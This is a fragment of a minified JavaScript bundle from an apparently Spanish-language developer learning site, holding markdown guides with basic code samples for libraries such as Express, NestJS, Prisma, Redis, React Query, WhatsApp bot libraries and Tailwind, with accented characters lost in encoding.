rounded-full h-12 w-12 border-t-2 border-b-2 border-primary-500"})}):!t||!i?(console.error("AdminRoute: Access denied.",{hasUser:!!t,uid:t?.uid,role:e.role,isAdmin:i}),b.jsx(Yj,{to:"/",replace:!0})):a},AN=[{id:"express",name:"Express",packageName:"express",version:"v4.18.2",description:"El framework estndar para servidores web rpidos y minimalistas en Node.js.",icon:b.jsx(pc,{className:"lib-icon"}),tags:["Backend","HTTP","Web"],link:"https://expressjs.com/",guide:`
# Gua Exclusiva de Express.js 

Express.js es la infraestructura web rpida, sin opinin y minimalista para Node.js. Es con altsima probabilidad el framework con el que construirs tu primera API y el que te acompaar en tu carrera de backend.

##  Para qu sirve realmente?
Imagina Node.js como el motor de un coche. Si quieres hacer una radio, los asientos o el volante, tendras que construirlos desde cero. Express.js es todo el chasis y equipamiento que convierte tu servidor base en una **API REST profesional**.

Te permite definir rutas (\`/usuarios\`, \`/productos\`), procesar peticiones HTTP (GET, POST), manejar middlewares (autenticacin, logs) y responder JSON rpidamente al frontend.

##  Instalacin y Setup Bsico

\`\`\`bash
npm install express
\`\`\`

\`\`\`javascript
// index.js
const express = require('express');
const app = express();
const port = 3000;

// Permite procesar JSON en el cuerpo de las peticiones
app.use(express.json());

// Ruta bsica GET
app.get('/api/saludo', (req, res) => {
  res.json({ mensaje: 'Hola desde Express!' });
});

app.listen(port, () => {
  console.log(\`Servidor corriendo magistralmente en http://localhost:\${port}\`);
});
\`\`\`

##  Conceptos Clave (El Secreto de Express)

1. **Rutas (Routes):** Son los "endpoints" a los que el frontend hace peticiones. Ej: \`app.post('/login', ...)\`
2. **Request (req) y Response (res):** \`req\` trae lo que el usuario enva (datos, tokens). \`res\` es el objeto que usas para enviar la respuesta de vuelta.
3. **Middlewares:** El corazn de Express. Son funciones que se ejecutan *en el medio*, recibiendo la peticin antes de que llegue a la ruta final. Se usan para verificar tokens, medir tiempos o parsear datos.
`},{id:"nestjs",name:"NestJS",packageName:"@nestjs/core",version:"v10.0.0",description:"Framework progresivo para aplicaciones backend escalables y modulares con arquitectura slida.",icon:b.jsx(_s,{className:"lib-icon"}),tags:["Arquitectura","TypeScript"],link:"https://nestjs.com/",guide:`
#  NestJS - Arquitectura Nivel Enterprise

Si Express te da los ladrillos, NestJS te da los planos, los arquitectos y el edificio construido. Inspirado fuertemente en Angular, utiliza TypeScript y decoradores para forzarte a escribir cdigo limpio y testeable.

##  Por qu las empresas aman NestJS
Escribir backend en Node a menudo resulta en un caos de archivos sin estructura. NestJS resuelve esto mediante:
*   **Inyeccin de Dependencias (DI):** Desacopla la lgica y facilita el testing.
*   **Mdulos:** Agrupa tu cdigo por dominio (AuthModule, UserModule).
*   **Decoradores Mgicos:** \`@Get('/users')\` hace que no tengas que lidiar casi nunca con objetos \`req\` o \`res\` manuales.

##  Instalacin y CLI

\`\`\`bash
npm i -g @nestjs/cli
nest new mi-proyecto-backend
\`\`\`

##  Estructura Bsica (Controlador y Servicio)

**El Controlador (Recibe las peticiones HTTP):**
\`\`\`typescript
import { Controller, Get, Post, Body } from '@nestjs/common';
import { UsersService } from './users.service';

@Controller('users')
export class UsersController {
  constructor(private readonly usersService: UsersService) {} // <-- Magia de DI

  @Get()
  getAll() {
    return this.usersService.findAll(); // Devuelve JSON automtico
  }
}
\`\`\`

**El Servicio (Contiene la lgica pesada):**
\`\`\`typescript
import { Injectable } from '@nestjs/common';

@Injectable()
export class UsersService {
  private users = [{ id: 1, name: 'Octavio' }];

  findAll() {
    return this.users;
  }
}
\`\`\`
`},{id:"fastify",name:"Fastify",packageName:"fastify",version:"v4.21.0",description:"Framework web extremadamente veloz con el menor overhead de recursos posible.",icon:b.jsx(Jn,{className:"lib-icon"}),tags:["Rendimiento","Backend"],link:"https://www.fastify.io/",guide:`
#  Fastify - La Evolucin de la Velocidad

Fastify es el framework de Node.js diseado puramente para ser el competidor ms rpido en el ecosistema, superando a Express por un enorme margen en benchmarks bajo estrs alto de concurrencia.

##  Rendimiento sobre todo
Cmo logra ser tan rpido? Fastify no usa el parseador JSON global de JS de manera simple. Trae su propia validacin y parseo basado en esquemas (Schema-based) que le permite compilar en C++ de fondo cmo transformar JSON a una velocidad absurda.

##  Setup Tpico

\`\`\`bash
npm i fastify
\`\`\`

\`\`\`javascript
const fastify = require('fastify')({ logger: true })

// Ruta sencilla
fastify.get('/', async (request, reply) => {
  return { hello: 'world' }
})

// Validacin en la ruta directamente (Gratis!)
fastify.post('/login', {
  schema: {
    body: {
      type: 'object',
      required: ['email', 'password'],
      properties: { email: { type: 'string' } }
    }
  }
}, async (request, reply) => {
  return { status: 'logged in' }
})

const start = async () => {
  await fastify.listen({ port: 3000 })
}
start()
\`\`\`
`},{id:"apollo",name:"Apollo Server",packageName:"@apollo/server",version:"v4.9.0",description:"La mejor forma de construir una API GraphQL lista para produccin y auto-documentada.",icon:b.jsx(Us,{className:"lib-icon"}),tags:["GraphQL","API"],link:"https://www.apollographql.com/",guide:`
#  Apollo Server - Dominando GraphQL

El estndar mundial para montar servidores y APIs que usan GraphQL en Node.js. En vez de exponer muchas URLs aburridas (como \`/usuarios\`, \`/productos\`), expones UN solo punto ciego (\`/graphql\`) y le das el poder al frontend de pedir solo lo que necesita.

##  Resolvers y TypeDefs
En Apollo debes definir dos cosas absolutamente fundamentales:
1.  **TypeDefs:** Un "Contrato" literal. Defines qu entidades existen y qu consultas se pueden hacer.
2.  **Resolvers:** Las funciones que saben "dnde" ir a buscar esos datos cuando el frontend pide algo (a una base de datos, a otra API, etc).

##  Setup Tpico

\`\`\`javascript
import { ApolloServer } from '@apollo/server';
import { startStandaloneServer } from '@apollo/server/standalone';

// 1. EL CONTRATO (Schema)
const typeDefs = \`
  type Libro {
    titulo: String
    autor: String
  }

  type Query {
    libros: [Libro]
  }
\`;

// 2. DONDE ESTN LOS DATOS O COMO BUSCARLOS
const resolvers = {
  Query: {
    libros: () => [
      { titulo: 'El Color de la Magia', autor: 'Terry Pratchett' }
    ],
  },
};

// 3. ARRANCAMOS
const server = new ApolloServer({ typeDefs, resolvers });
const { url } = await startStandaloneServer(server, { listen: { port: 4000 } });
console.log(\` Servidor GraphQL volando en \${url}\`);
\`\`\`
`},{id:"socketio",name:"Socket.io",packageName:"socket.io",version:"v4.7.2",description:"Motor para comunicacin bidireccional en tiempo real basada en eventos.",icon:b.jsx(Jn,{className:"lib-icon"}),tags:["Real-time","WebSockets"],link:"https://socket.io/"},{id:"trpc",name:"tRPC",packageName:"@trpc/server",version:"v10.37.0",description:"APIs con tipado seguro de extremo a extremo sin necesidad de generar esquemas.",icon:b.jsx(Jn,{className:"lib-icon"}),tags:["Typesafe","RPC"],link:"https://trpc.io/"},{id:"postman",name:"Postman",packageName:"N/A",version:"v10",description:"Plataforma lder para construir, usar, probar y documentar APIs.",icon:b.jsx(_s,{className:"lib-icon"}),tags:["Herramientas","Testing API"],link:"https://www.postman.com/",guide:`
# Postman - Destructor de APIs

No es una librera de cdigo (por ende no la instalas con npm), es un software vital que reside en el escritorio de cada desarrollador. Sirve para chatear con APIs.

## Para qu se usa?
Cuando construyes un backend, necesitas mandarle peticiones POST, leer bases de datos, y mandarle tokens de autenticacin para comprobar que tus rutas/endpoints funcionen bien SIN TENER QUE CONSTRUIR un frontend (pginas HTML/React) primero.

*   Puedes guardar mltiples peticiones en **Colecciones**.
*   Puedes configurar **Entornos** (variables Dev vs. Prod).
*   Puedes automatizar **Tests** que se corren antes de desplegar cdigo.
`},{id:"prisma",name:"Prisma",packageName:"prisma",version:"v5.2.0",description:"Siguiente generacin de ORM que hace que trabajar con bases de datos sea intuitivo.",icon:b.jsx(wp,{className:"lib-icon"}),tags:["ORM","Database","SQL"],link:"https://www.prisma.io/",guide:`
# Prisma - El ORM Perfecto para TypeScript

Prisma revolucion el mundo de las bases de datos en Node porque ofrece autocompletado en el IDE ridculamente preciso y un modelo declarativo.

## El Esquema Mgico
En Prisma diseas tu base de datos en un solo lugar limpio (\`schema.prisma\`). El software entonces hace dos cosas:
1. Aplica esos cambios en PostgreSQL / MySQL.
2. Genera cdigo TypeScript que detecta si ests a punto de pedir algo mal.

\`\`\`prisma
// schema.prisma
model User {
  id    Int     @id @default(autoincrement())
  email String  @unique
  name  String?
  posts Post[]
}

model Post {
  id        Int     @id @default(autoincrement())
  title     String
  authorId  Int
  author    User    @relation(fields: [authorId], references: [id])
}
\`\`\`

## Uso en tu Cdigo
Cero strings mgicos en cdigo, puras funciones puras:

\`\`\`typescript
const newPost = await prisma.user.create({
  data: {
    name: 'Octavio',
    email: 'octavio@progravio.com',
    posts: {
      create: { title: 'Cmo dominar Prisma' },
    },
  },
})

// Autocompletado detecta que newUser.id existe
\`\`\`
`},{id:"drizzle",name:"Drizzle ORM",packageName:"drizzle-orm",version:"v0.28.0",description:"ORM de TypeScript ligero y veloz que se siente como escribir SQL nativo.",icon:b.jsx(Jn,{className:"lib-icon"}),tags:["ORM","SQL","Ligero"],link:"https://orm.drizzle.team/"},{id:"mongoose",name:"Mongoose",packageName:"mongoose",version:"v7.4.0",description:"Modelado de objetos elegante para MongoDB, con validacin y esquemas integrados.",icon:b.jsx(Zr,{className:"lib-icon"}),tags:["MongoDB","NoSQL","Esquema"],link:"https://mongoosejs.com/",guide:`
# Mongoose - Orden para el Caos de MongoDB

MongoDB de por s guarda datos libres (sin estructura rgida, puro JSON). Esto es rpido al principio, pero desastroso a largo plazo. Mongoose interviene para proveer **Esquemas Rgidos** en JavaScript, reglas de tipo y hooks antes de guardar algo.

## Cmo estructura?

A diferencia de SQL, las relaciones se guardan con referencias lgicas o documentos anidados. Aqu est tu modelo protector:

\`\`\`javascript
const mongoose = require('mongoose');

// 1. El Esquema Protector
const blogSchema = new mongoose.Schema({
  title:  { type: String, required: true },
  author: String,
  body:   String,
  comments: [{ body: String, date: Date }],
  hidden: Boolean,
  meta: {
    votes: { type: Number, default: 0 }
  }
});

// 2. El Modelo Constructor
const Blog = mongoose.model('Blog', blogSchema);

// 3. Crear registros
const createB = async () => {
    const articulo = new Blog({ title: 'Aprende NodeJS en 1 dia' });
    await articulo.save();
}
\`\`\`
`},{id:"redis",name:"Redis",packageName:"redis",version:"v4.6.7",description:"Almacn de datos en memoria ultrarrpido, ideal para cach y colas de mensajes.",icon:b.jsx(Jn,{className:"lib-icon"}),tags:["Cach","NoSQL","Rendimiento"],link:"https://redis.io/",guide:`
# Redis - Magia en Memoria RAM

Cuando necesitas que algo se lea estpidamente rpido y no puedes esperar a leer un disco rgido tradicional, usas Redis (Remote Dictionary Server). Todo vive en Memoria RAM con estructuras clave-valor.

## Usos Crticos en el Mundo Real
1.  **Caching de API:** Si 50.000 usuarios piden consultar los estrenos de Netflix, la base de datos morir. Con Redis, buscas en la base de datos la *primera* vez, guardas el panel en Redis por 1 hora, y los siguientes 49.999 usuarios lo leen de Redis en 1 milisegundo.
2.  **Manejo de Sesiones / Tokens:** JWT se guarda sin estado, pero si un usuario cierra sesin brutalmente, necesitas una "lista negra" de tokens en RAM, ah brilla Redis.
3.  **Colas (Queues):** Guardar trabajos pesados a "renderizar en segundo plano".

## Uso Mnimo

\`\`\`javascript
import { createClient } from 'redis';

const client = await createClient()
  .on('error', err => console.log('Redis Fall', err))
  .connect();

// Escribir a RAM
await client.set('candidatos-aprobados', '53');

// Leer de RAM (milisegundos)
const value = await client.get('candidatos-aprobados');
\`\`\`
`},{id:"reactquery",name:"React Query",packageName:"@tanstack/react-query",version:"v4.29.0",description:"Gestin de peticiones y sincronizacin de estado del servidor sin esfuerzo.",icon:b.jsx(Us,{className:"lib-icon"}),tags:["Estado","Async","Cach"],link:"https://tanstack.com/query",guide:`
# React Query (TanStack Query) - Controlando el Asincronismo

Es la solucin definitiva (y estndar de la industria) para **fetching asncrono** en React. Te permite dejar de usar \`useEffect\` complejos y \`useState\` repetitivos.

## Qu problema soluciona?
Antes: Para traer datos de una API usabas \`useEffect\`, y creabas tres estados manuales: \`data\`, \`loading\`, y \`error\`. Si navegabas a otra pgina y volvas, volvas a hacer la peticin.

Con React Query: Haces la peticin una sola vez, la cachea y te la devuelve instantneamente la prxima vez, mientras verifica en segundo plano si hay nuevos datos. Es magia pura para el rendimiento.

## Instalacin y Configuracin Mnima

\`\`\`bash
npm i @tanstack/react-query
\`\`\`

En lo ms alto de tu app (ej. \`main.tsx\`):
\`\`\`tsx
import { QueryClient, QueryClientProvider } from '@tanstack/react-query'

const queryClient = new QueryClient()

function App() {
  return (
    <QueryClientProvider client={queryClient}>
      <TuAppPrincipal />
    </QueryClientProvider>
  )
}
\`\`\`

## Usando el superpoder: useQuery

\`\`\`tsx
import { useQuery } from '@tanstack/react-query'
import axios from 'axios'

function PerfilUsuario({ userId }) {
  // 'data', 'isLoading' y 'isError' ya vienen gratis
  const { data, isLoading, isError } = useQuery({
    queryKey: ['usuario', userId], // Su huella digital para la cach
    queryFn: async () => {
      const resp = await axios.get(\`/api/usuarios/\${userId}\`)
      return resp.data
    }
  })

  if (isLoading) return <span>Cargando perfil...</span>
  if (isError) return <span>Uy, error tremendo</span>

  return <div>Bienvenido {data.nombre}</div>
}
\`\`\`

## Mutaciones (POST, PUT, DELETE)
Para cambiar datos, usamos \`useMutation\`. En vez de cachear, ejecuta la accin e invalida el cach viejo si se lo pides para que la pantalla se actualice sola con los datos nuevos.
`},{id:"zustand",name:"Zustand",packageName:"zustand",version:"v4.3.9",description:"Gestin de estado global minimalista, rpida y basada en hooks para React.",icon:b.jsx(Jf,{className:"lib-icon"}),tags:["Estado","Hooks","Ligero"],link:"https://zustand-demo.pmnd.rs/",guide:`
# Zustand - Gestin de Estado Global Minimalista

Zustand es un pequeo, rpido y escalable gestor de estado (parecido a Redux pero sin su complejidad). 

## Por qu Zustand?
Redux requiere boilerplate: reducers, actions, action types, stores y despachadores. Zustand resume todo esto en un solo hook de React que puedes usar en cualquier parte de tu aplicacin sin necesidad de envolver componentes en "Providers".

## Instalacin

\`\`\`bash
npm install zustand
\`\`\`

## Creando tu Estado Global
\`\`\`javascript
import { create } from 'zustand'

const useStore = create((set) => ({
  bears: 0,
  increasePopulation: () => set((state) => ({ bears: state.bears + 1 })),
  removeAllBears: () => set({ bears: 0 }),
}))

function BearCounter() {
  const bears = useStore((state) => state.bears)
  return <h1>{bears} around here ...</h1>
}

function Controls() {
  const increasePopulation = useStore((state) => state.increasePopulation)
  return <button onClick={increasePopulation}>one up</button>
}
\`\`\`
`},{id:"rhf",name:"React Hook Form",packageName:"react-hook-form",version:"v7.45.0",description:"Formularios eficientes con validacin de alto rendimiento y mnima re-renderizacin.",icon:b.jsx(xd,{className:"lib-icon"}),tags:["Formularios","Validacin"],link:"https://react-hook-form.com/",guide:`
# React Hook Form - Formularios veloces

Una biblioteca que adopta el uso de inputs no controlados (uncontrolled components) en React para maximizar el rendimiento.

## El Problema con Formularios en React
En React tradicional, al atar un \`value\` a un \`useState\`, cada vez que el usuario presiona una tecla en un input, se "re-renderiza" todo el componente. En un formulario gigantesco, esto causa un bajn de frames masivo. 

React Hook Form asla este re-renderizado haciendo que los inputs mantengan su propio estado interno nativo del DOM hasta que el formulario se enva.

## Ejemplo de uso

\`\`\`tsx
import { useForm, SubmitHandler } from "react-hook-form"

type Inputs = {
  example: string
  exampleRequired: string
}

export default function App() {
  const {
    register,
    handleSubmit,
    watch,
    formState: { errors },
  } = useForm<Inputs>()
  const onSubmit: SubmitHandler<Inputs> = (data) => console.log(data)

  return (
    /* "handleSubmit" validar los inputs antes de llamar a "onSubmit" */
    <form onSubmit={handleSubmit(onSubmit)}>
      {/* Registra tu input dentro del hook */}
      <input defaultValue="test" {...register("example")} />
      
      {/* Incluye reglas de validacin bsicas de HTML */}
      <input {...register("exampleRequired", { required: true })} />
      {errors.exampleRequired && <span>Este campo es obligatorio</span>}
      
      <input type="submit" />
    </form>
  )
}
\`\`\`
`},{id:"lucide",name:"Lucide React",packageName:"lucide-react",version:"v0.263.1",description:"Coleccin de iconos hermosa y consistente, optimizada para aplicaciones modernas.",icon:b.jsx(_s,{className:"lib-icon"}),tags:["Iconos","React","SVG"],link:"https://lucide.dev/",guide:`
# Lucide React - Iconos Consistentes

Un fork de Feather Icons creado por la comunidad que ha crecido enormemente, proporcionando iconos hermosos, con trazos consistentes y ultra optimizados.

## Por qu no FontAwesome?
Las libreras antiguas inyectaban fuentes masivas o un peso tremendo a tu web. Lucide exporta cada icono como un componente React individual y escalable (SVG), lo que significa que a travs del *Tree Shaking*, solo empaquetas los iconos exactos que uses.

## Uso en React
\`\`\`tsx
import { Camera, Trash, Settings } from 'lucide-react';

const PanelControles = () => {
  return (
    <div className="flex gap-4">
      <button><Camera size={24} color="blue" /></button>
      <button><Trash size={24} color="red" /></button>
      <button><Settings strokeWidth={1.5} /></button>
    </div>
  )
}
\`\`\`
`},{id:"zod",name:"Zod",packageName:"zod",version:"v3.21.4",description:"Esquemas de validacin con inferencia de tipos de TypeScript esttica y potente.",icon:b.jsx(Qr,{className:"lib-icon"}),tags:["Validacin","TypeScript"],link:"https://zod.dev/",guide:`
# Zod - Tipado Fuerte para Validaciones

Zod es una biblioteca de declaracin de esquemas y validacin. Su principal filosofa es eliminar las declaraciones dobles de tipos. Declaras un validador una sola vez y Zod infiere automticamente el tipo esttico de TypeScript.

## Uso Bsico

\`\`\`typescript
import { z } from "zod";

// Creando un esquema
const User = z.object({
  username: z.string(),
  email: z.string().email(),
  age: z.number().min(18) // Validaciones integradas
});

// Zod extrae automticamente la Interfaz
type User = z.infer<typeof User>;
/*
type User = {
  username: string;
  email: string;
  age: number;
}
*/

// Parseando datos
User.parse({ username: "Ludwig", email: "ludwig@ejemplo.com", age: 24 }); // OK
User.parse({ username: "Ludwig" }); // Lanza un error detallado (falta el mail y edad)
\`\`\`

## Integracin con React Hook Form
Se utiliza masivamente junto con \`@hookform/resolvers\` para que Zod se encargue de validar tus formularios en el cliente y en el servidor bajo la misma fuente de verdad.
`},{id:"fastapi",name:"FastAPI",packageName:"fastapi[all]",version:"v0.100.0",description:"Framework moderno y de alto rendimiento para APIs con Python basada en tipos.",icon:b.jsx(Jn,{className:"lib-icon"}),tags:["Python","Backend","API"],link:"https://fastapi.tiangolo.com/",guide:`
# FastAPI - La Revolucin del Backend en Python

FastAPI tom por asalto el ecosistema de Python al combinar un rendimiento extremo (comparable a NodeJS y Go) con una experiencia de desarrollo basada 100% en los tipos de datos de Python moderno.

## Por qu es tan popular?
1.  **Velocidad:** Est construido sobre Starlette y Pydantic, lo que lo hace ridculamente rpido.
2.  **Validacin Automtica:** Si le dices que una ruta recibe un \`int\`, FastAPI rechaza automticamente cualquier peticin que enve un \`string\`, sin que t escribas validaciones.
3.  **Documentacin Interactiva:** Genera un Swagger UI de forma automtica basado en tu cdigo. Cero esfuerzo extra.

## Ejemplo Bsico

\`\`\`python
from fastapi import FastAPI
from pydantic import BaseModel

app = FastAPI()

class Item(BaseModel):
    name: str
    price: float
    is_offer: bool = None

@app.get("/")
def read_root():
    return {"Hello": "World"}

@app.post("/items/{item_id}")
def update_item(item_id: int, item: Item):
    # FastAPI ya valid que item_id es int y que item cumple el esquema
    return {"item_name": item.name, "item_id": item_id}
\`\`\`
`},{id:"django",name:"Django",packageName:"Django",version:"v4.2",description:"El framework web para perfeccionistas con plazos de entrega, robusto y seguro.",icon:b.jsx(xd,{className:"lib-icon"}),tags:["Python","Backend","Fullstack"],link:"https://www.djangoproject.com/",guide:`
# Django - El Framework Todo Incluido

A diferencia de Flask o Express, Django viene con **pilas incluidas** ("batteries-included"). Esto significa que trae todo lo necesario para construir una app giganteciendo un solo estndar.

## Sus Armas Principales
*   **ORM Intocable:** Probablemente el mejor ORM jams creado en cualquier lenguaje.
*   **Panel de Admin Automtico:** Creas tus modelos de base de datos y Django te genera un panel de administracin visual completo al instante.
*   **Seguridad:** Te protege automticamente contra SQL Injection, CSRF, Clickjacking y XSS.

## Creando un Modelo

\`\`\`python
from django.db import models

class Reporter(models.Model):
    full_name = models.CharField(max_length=70)

    def __str__(self):
        return self.full_name

class Article(models.Model):
    pub_date = models.DateField()
    headline = models.CharField(max_length=200)
    content = models.TextField()
    reporter = models.ForeignKey(Reporter, on_delete=models.CASCADE)

    def __str__(self):
        return self.headline
\`\`\`
`},{id:"pandas",name:"Pandas",packageName:"pandas",version:"v2.0.3",description:"La herramienta definitiva para anlisis de datos y manipulacin de estructuras tabulares.",icon:b.jsx(_o,{className:"lib-icon"}),tags:["Python","Data Science"],link:"https://pandas.pydata.org/",guide:`
# Pandas - El Excel de los Programadores

Pandas es la piedra angular del anlisis de datos en Python. Toma datos de cualquier fuente (CSV, Excel, bases de datos) y los convierte en \`DataFrames\` inmensamente manipulables.

## Qu puedes hacer en 3 lneas?

\`\`\`python
import pandas as pd

# 1. Cargar 1 milln de filas en milisegundos
df = pd.read_csv("ventas_anuales.csv")

# 2. Limpiar: Eliminar filas donde falta el DNI del cliente
df_limpio = df.dropna(subset=['dni'])

# 3. Analizar: Total vendido por mes
ventas_mensuales = df_limpio.groupby('mes')['monto'].sum()
print(ventas_mensuales)
\`\`\`
`},{id:"numpy",name:"NumPy",packageName:"numpy",version:"v1.25.0",description:"Base para la computacin cientfica en Python con soporte para arrays multidimensionales.",icon:b.jsx(Jf,{className:"lib-icon"}),tags:["Python","Computacin"],link:"https://numpy.org/",guide:`
# NumPy - El Motor Matemtico

Mientras que las listas normales de Python son lentas porque guardan el tipo de dato en cada elemento, los arreglos de NumPy (Ndarrays) son bloques de memoria en C puros.

## Por qu importa?
Machine Learning, procesamiento de imgenes o modelos 3D simplemente *no funcionaran* sin la velocidad matemtica de NumPy.

\`\`\`python
import numpy as np

# Crear matriz rpida
a = np.array([[1, 2], [3, 4]])
b = np.array([[5, 6], [7, 8]])

# Multiplicacin de matrices a nivel de procesador
resultado = np.dot(a, b)
# [[19 22]
#  [43 50]]
\`\`\`
`},{id:"wawebjs",name:"WA Web.js",packageName:"whatsapp-web.js",version:"v1.23.0",description:"Librera de Node.js que conecta con WhatsApp Web para automatizar chats y bots.",icon:b.jsx(fH,{className:"lib-icon"}),tags:["WhatsApp","Bot","Node.js","QR Code","Terminal"],link:"https://wwebjs.dev/",guide:`
# WA Web.js - Tu Propio Bot de WhatsApp

Es la forma ms fcil de crear un bot de WhatsApp gratis. Funciona levantando un navegador Chromium oculto (Puppeteer) que abre WhatsApp Web real.

## Uso Bsico

\`\`\`javascript
const { Client } = require('whatsapp-web.js');
const qrcode = require('qrcode-terminal');

const client = new Client();

// Muestra el QR en tu terminal para logearte
client.on('qr', (qr) => {
    qrcode.generate(qr, {small: true});
});

client.on('ready', () => {
    console.log('Cliente listo!');
});

// Auto-respondedor
client.on('message', message => {
	if(message.body === '!ping') {
		message.reply('pong');
	}
});

client.initialize();
\`\`\`
`},{id:"twilio",name:"Twilio WA",packageName:"twilio",version:"v8.0.0",description:"API empresarial lder para enviar y recibir mensajes de WhatsApp de forma oficial.",icon:b.jsx(Br,{className:"lib-icon"}),tags:["WhatsApp","API","Cloud"],link:"https://www.twilio.com/whatsapp",guide:`
# Twilio WA - Envo Corporativo Oficial

Mientras que Baileys y WA Web.js son geniales para proyectos personales o startups, no son la API oficial de WhatsApp. Si necesitas enviar notificaciones crticas (como cdigos de seguridad bancarios o alertas de aerolneas), necesitas acceder a la API de WhatsApp Cloud, y Twilio es el puente ms profesional.

## Por qu pagar
*   **0% Riesgo de Baneo:** Al usar la API oficial Business, Facebook aprueba tus plantillas. Tu nmero jams ser bloqueado.
*   **Escalabilidad:** Puede enviar miles de mensajes por segundo sin "desconectar el celular".
*   **Omnicanal:** La misma librera tambin enva SMS y correos.
`},{id:"baileys",name:"Baileys",packageName:"@adiwajshing/baileys",version:"v6.4.1",description:"Librera de Node.js para conectar con WhatsApp sin necesidad de una instancia web.",icon:b.jsx(Jn,{className:"lib-icon"}),tags:["WhatsApp","Bot","Messaging","QR Code","Terminal"],link:"https://github.com/WhiskeySockets/Baileys",guide:`
# Baileys - WhatsApp Multi-Device Extremadamente Rpido

A diferencia de \`whatsapp-web.js\`, Baileys **no necesita un navegador gigante corriendo por detrs**. Se conecta directamente a los WebSockets de WhatsApp fingiendo ser la aplicacin mvil oficial. 

## Por qu usar Baileys?
*   Es 10x ms ligero de RAM que Puppeteer.
*   Ideal para servidores Linux o nubes baratas.
*   Conecta al instante tras la primera validacin.

*Aviso: Es ms complejo de configurar que wa-web.js, pero a escala profesional es obligatorio.*
`},{id:"qrterminal",name:"QR Terminal",packageName:"qrcode-terminal",version:"v0.12.0",description:"Genera cdigos QR directamente en la terminal. Ideal para vincular dispositivos y bots.",icon:b.jsx(_s,{className:"lib-icon"}),tags:["Herramientas","Terminal","Node.js"],link:"https://github.com/gtanner/qrcode-terminal",guide:`
# QR Terminal - Conexin Rpida en Consola

Una herramienta microscpica de una sola funcin que salva la vida de todos los desarrolladores de bots.

## La Magia
Cuando construyes un bot de WhatsApp o un sistema de login avanzado en tu servidor NodeJS (pantalla negra), no tienes una interfaz grfica para mostrar el famoso cdigo QR para escanear con el celular.

Esta librera toma el texto del QR y lo dibuja usando caracteres de texto (ASCII) coloreados en tu propia terminal.

\`\`\`javascript
const qrcode = require('qrcode-terminal');

// Genera un bloque de texto escaneable por tu app de cmara
qrcode.generate('https://mi-sistema-seguro.com/login_token_123', { small: true });
\`\`\`
`},{id:"tailwind",name:"Tailwind CSS",packageName:"tailwindcss",version:"v3.3.0",description:"Crea interfaces modernas rpidamente sin salir de tu HTML usando clases de utilidad.",icon:b.jsx(xd,{className:"lib-icon"}),tags:["Estilos","CSS","Productividad"],link:"https://tailwindcss.com/",guide:`
# Tailwind CSS - El Motor de Interfaz Moderno

Tailwind no es una librera de diseo ms (como Bootstrap) donde te dan botones ya armados. Es un framework "utility-first" que te brinda bloques de colores, espacios y posicionamiento para que escribas todo el diseo sin siquiera tocar un archivo CSS.

## Para qu sirve?
*   **Velocidad absurda:** Escribir \`flex items-center justify-between p-4 bg-gray-900\` en la clase de tu div es mil veces ms rpido que declarar clases e ir a otro archivo.
*   **Bundle enano:** Al compilar, Tailwind escanea todo tu proyecto y purga absolutamente **todas** las clases que no utilizaste (no como CSS clsico que cargas mil lneas muertas).
*   **Cohesin de diseo:** Te forza a usar sus paletas de colores (escala de 100 a 900) y su sistema de espaciado estndar, evitando la inconsistencia de diseo en un equipo.

## Ejemplo de Impacto Visual

Mira cmo estilaramos un bello botn oscuro con borde nen usando puro Tailwind:

\`\`\`html
<button className="
    px-6 py-3 
    bg-black text-white font-bold 
    rounded-lg border border-cyan-500/50
    shadow-[0_0_15px_rgba(6,182,212,0.5)]
    hover:shadow-[0_0_25px_rgba(6,182,212,0.8)]
    transition-all duration-300 transform hover:-translate-y-1
">
  Completar Leccin
</button>
\`\`\`

## Por qu causa "odio inicial"
Muchos devs sniors al ver Tailwind por primera vez piensan: *"Esto es espagueti en mi HTML!"*. Pero estadsticamente, la retencin de Tailwind es gigante. Tras 3 das de uso, ya no querrs volver a un archivo .css jams. Combnalo con React creando pequeos "componentes estpidos" reutilizables, y el "espagueti" desaparece.
`},{id:"framer",name:"Framer Motion",packageName:"framer-motion",version:"v10.12.4",description:"La biblioteca definitiva para crear animaciones potentes y fluidas en React.",icon:b.jsx(EH,{className:"lib-icon"}),tags:["Animacin","UI","UX"],link:"https://www.framer.com/motion/",guide:`
# Framer Motion - Animacin Elevada en React

En React nativo o CSS, animar la aparicin de un componente (cuando entra o sale del DOM) es asombrosamente complicado porque React destruye el elemento antes de que la animacin CSS termine. Framer Motion soluciona esto y ms.

## Magia Declarativa
Simplemente reemplazas tu \`<div>\` o \`<h1>\` por \`<motion.div>\` o \`<motion.h1>\`.

\`\`\`tsx
import { motion } from "framer-motion"

export const Modal = () => (
  <motion.div
    initial={{ opacity: 0, scale: 0.5 }}
    animate={{ opacity: 1, scale: 1 }}
    transition={{ duration: 0.5 }}
  >
    <h1>Caja Mgica</h1>
  </motion.div>
)
\`\`\`
`},{id:"shadcn",name:"Shadcn/UI",packageName:"lucide-react clsx tailwind-merge",version:"v0.1.0",description:"Componentes accesibles y personalizables que puedes copiar directamente a tu cdigo.",icon:b.jsx(_s,{className:"lib-icon"}),tags:["Componentes","Diseo"],link:"https://ui.shadcn.com/",guide:`
# Shadcn/UI - El Anti-Framework de Componentes

Durante aos reinaron Bootstrap, Material UI y Chakra UI. El problema de todos es que instalan un paquete NPM gigante en tu proyecto y es muy difcil alterar su cdigo interno si tu diseador pide algo especfico.

## Revolucin "Copy-Paste"
Shadcn/UI **no se instala como un paquete**. Te provee una herramienta de consola que **copia el cdigo fuente** del componente (ej. un Botn) directo a tus carpetas.

Al tener el cdigo crudo en tu proyecto:
1.  Tienes 100% de control sobre el Botn.
2.  Cero dependencias pesadas, todo est construido con utilidades limpias de Tailwind CSS y Radix UI (accesibilidad perfecta).
3.  Tu proyecto pesa la mitad.
`},{id:"vitest",name:"Vitest",packageName:"vitest",version:"v0.34.0",description:"Framework de testing ultrarrpido impulsado por Vite. El sucesor moderno de Jest.",icon:b.jsx(Jn,{className:"lib-icon"}),tags:["Testing","Backend","Frontend"],link:"https://vitest.dev/",guide:`
# Vitest - El Testing Moderno

Vitest est diseado especficamente para la era moderna (Vite). Es un reemplazo directo (drop-in) de Jest. Literalmente casi todas las APIs son iguales, pero el rendimiento es muchsimo mayor por la arquitectura HMR (Hot Module Replacement) nativa.

## Ejemplo Completo

\`\`\`typescript
import { describe, it, expect } from 'vitest'
import { calcularDescuento } from './carrito'

describe('Motor de Descuentos', () => {
  it('Debera aplicar 10% de descuento a VIPs', () => {
    const total = calcularDescuento({ importe: 1000, isVIP: true });
    expect(total).toBe(900);
  });

  it('Lanza error si el importe es negativo', () => {
    expect(() => calcularDescuento({ importe: -50 }))
